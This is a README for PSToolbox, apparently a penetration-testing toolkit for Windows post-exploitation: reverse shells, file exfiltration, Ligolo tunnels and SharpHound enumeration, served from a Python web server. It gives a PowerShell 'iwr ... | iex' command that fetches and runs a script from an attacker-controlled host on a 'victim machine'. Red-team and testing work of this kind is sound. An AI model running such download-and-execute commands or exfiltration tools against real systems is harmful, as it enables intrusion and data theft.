PSToolbox

PSToolbox is a collection of utilities designed for security operations, including network reconnaissance, reverse shell establishment, data exfiltration, and system analysis. This toolkit facilitates interactions with a python web server. It makes performing various other essential tasks in penetration testing and cybersecurity assessments easier once a foothold is established on a Windows machine.
Getting Started:

These instructions will guide you through setting up and using the PSToolbox on your local machine for development and testing purposes.
Prerequisites:

    Git
    Python 3
    Access to a PowerShell environment (for the victim machine simulation)

Installation:

    Clone the Repository

    Begin by cloning the PSToolbox repository to your local machine:

    gh repo clone jeamajoal/PSToolbox


Prepare the Loadables Directory:

# Add any required files to the 'loadables' directory
Navigate to the cloned repository and ensure the loadables directory contains all necessary tools and scripts you intend to serve.
At this time, I have only added to the directory the tools that I have created. For the other tools referenced in the gettoolbox.ps1 file you will need to add them yourself.

Start the Web Server:

Run the provided Python web server script, postserver.py, to serve the content of the loadables directory.

    python3 python/postserver.py -b 0.0.0.0 -p 8443 -u ~/uploads
    *NOTE:  The uploads dir is being set OUTSIDE of the loadables folder.  This will make your Get-TollboxItems (gti) run mor efficiently later if you so choose. Otherwise if you are ok waiting you can keep it in your loadables folder. 

Usage

To use the toolbox from a victim machine (simulated environment), run the following PowerShell command. This command utilizes Invoke-WebRequest (alias iwr) to source the GetToolbox.ps1 script from the web server:

powershell

iwr http://<YourServerIP>:<Port>/GetToolbox.ps1 -UseBasic | iex

You will be prompted for your ip and the web server port.
Features

    Ligolo Agent Connection: Initiates a reverse tunnel connection using Ligolo.
    SharpHound Execution: Executes SharpHound for Active Directory enumeration.
    Reverse Shell: Depending on the type (NC/Sliver), initiates a reverse shell.
    File Exfiltration: Facilitates sending files to a specified server.
    Toolbox Item Retrieval: Downloads items from a web server to the local system.

This project is licensed under the MIT License - see the LICENSE.md file for details.
Acknowledgments



